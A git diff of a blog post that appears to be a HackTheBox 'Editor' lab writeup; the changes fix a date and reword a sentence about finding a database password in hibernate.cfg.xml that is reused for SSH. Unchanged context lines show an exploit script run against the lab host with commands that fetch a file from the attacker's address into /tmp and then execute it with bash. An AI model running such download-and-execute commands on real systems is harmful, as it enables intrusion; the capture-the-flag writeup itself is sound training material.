@@ -1,7 +1,7 @@
 ---
 layout: post
 title: "Editor HTB Writeup"
-date: 2025-08-011 13:21:00 +0300
+date: 2025-08-11 13:21:00 +0300
 categories: [HackTheBox, Machines]
 tags: [cybersecurity, wikicms, hackthebox, machines,hacking]
 ---
@@ -100,7 +100,7 @@ python sa.py -u http://editor.htb:8080 -c "curl http://10.10.14.35:8080/ -O /tmp
 python sa.py -u http://editor.htb:8080 -c "bash /tmp/exp.sh"
 ```
 ### Getting Database Password
-In `hibernate.cfg.xml` I see the password of database. The password is same with SSH.
+I see the password of database in `hibernate.cfg.xml`. The password is same with SSH.
 
 # End
 This machine is a great example of the importance of the updating.
